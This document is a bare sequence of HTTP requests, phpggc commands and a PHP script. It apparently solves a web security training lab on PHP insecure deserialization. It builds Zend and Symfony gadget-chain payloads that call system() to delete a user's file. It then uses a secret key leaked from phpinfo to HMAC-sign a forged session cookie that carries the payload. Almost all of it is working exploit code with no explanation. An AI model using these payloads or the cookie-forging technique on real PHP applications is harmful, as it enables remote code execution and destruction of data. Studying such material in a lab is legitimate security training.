POST /login HTTP/1.1

username=wiener&password=peter

GET /my-account HTTP/1.1
Cookie: session=%7B%22token%22%3A%22Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJmaGdxMXh5YWRjcGRzampraGE5YzE2MjNjd2ZwOGhnNCI7fQ%3D%3D%22%2C%22sig_hmac_sha1%22%3A%2208b757e7bd6af6c531b2d8e2bfafee7d6d3aa480%22%7D

GET /cgi-bin/phpinfo.php HTTP/1.1
Cookie: session=%7B%22token%22%3A%22Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJmaGdxMXh5YWRjcGRzampraGE5YzE2MjNjd2ZwOGhnNCI7fQ%3D%3D%22%2C%22sig_hmac_sha1%22%3A%2208b757e7bd6af6c531b2d8e2bfafee7d6d3aa480%22%7D

$ phpggc-master/phpggc -l

$ phpggc-master/phpggc -i ZendFramework/RCE3

$ phpggc-master/phpggc ZendFramework/RCE3 system 'rm -f /home/carlos/morale.txt'

$ phpggc-master/phpggc -u ZendFramework/RCE3 system 'rm -f /home/carlos/morale.txt'

GET /my-account HTTP/1.1
Cookie: session=O%3A15%3A%22Zend%5CLog%5CLogger%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00writers%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A20%3A%22Zend%5CLog%5CWriter%5CMail%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00eventsToMail%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A0%3B%7Ds%3A21%3A%22%00%2A%00subjectPrependText%22%3Bs%3A0%3A%22%22%3Bs%3A24%3A%22%00%2A%00numEntriesPerPriority%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A14%3A%22Zend%5CTag%5CCloud%22%3A2%3A%7Bs%3A7%3A%22%00%2A%00tags%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A0%3A%22%22%3B%7Ds%3A15%3A%22%00%2A%00tagDecorator%22%3BO%3A34%3A%22Zend%5CTag%5CCloud%5CDecorator%5CHtmlCloud%22%3A3%3A%7Bs%3A12%3A%22%00%2A%00separator%22%3Bs%3A0%3A%22%22%3Bs%3A10%3A%22%00%2A%00escaper%22%3BO%3A20%3A%22Zend%5CEscaper%5CEscaper%22%3A1%3A%7Bs%3A18%3A%22%00%2A%00htmlAttrMatcher%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A23%3A%22Zend%5CFilter%5CFilterChain%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00filters%22%3BO%3A13%3A%22SplFixedArray%22%3A2%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BO%3A14%3A%22Zend%5CJson%5CExpr%22%3A1%3A%7Bs%3A13%3A%22%00%2A%00expression%22%3Bs%3A29%3A%22rm+-f+%2Fhome%2Fcarlos%2Fmorale.txt%22%3B%7Di%3A1%3Bs%3A10%3A%22__toString%22%3B%7Di%3A1%3Bs%3A6%3A%22system%22%3B%7D%7Di%3A1%3Bs%3A6%3A%22filter%22%3B%7D%7Ds%3A11%3A%22%00%2A%00htmlTags%22%3Ba%3A1%3A%7Bs%3A1%3A%22h%22%3Ba%3A1%3A%7Bs%3A1%3A%22a%22%3Bs%3A1%3A%22%21%22%3B%7D%7D%7D%7D%7D%7D%7D%7D

$ phpggc-master/phpggc -i Symfony/RCE4

$ phpggc-master/phpggc Symfony/RCE4 system 'rm -f /home/carlos/morale.txt'

$ phpggc-master/phpggc -b Symfony/RCE4 system 'rm -f /home/carlos/morale.txt'

<?php
$object = 'Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyOToicm0gLWYgL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjY6InN5c3RlbSI7fX0=';
$secretKey = 'xy7r42tdslj9n7irdk52cqe2cebdlhuu';
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
?>

GET /my-account HTTP/1.1
Cookie: session=%7B%22token%22%3A%22Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyOToicm0gLWYgL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjY6InN5c3RlbSI7fX0%3D%22%2C%22sig_hmac_sha1%22%3A%22286126a67c281b43471401d05ca82f5929977b95%22%7D
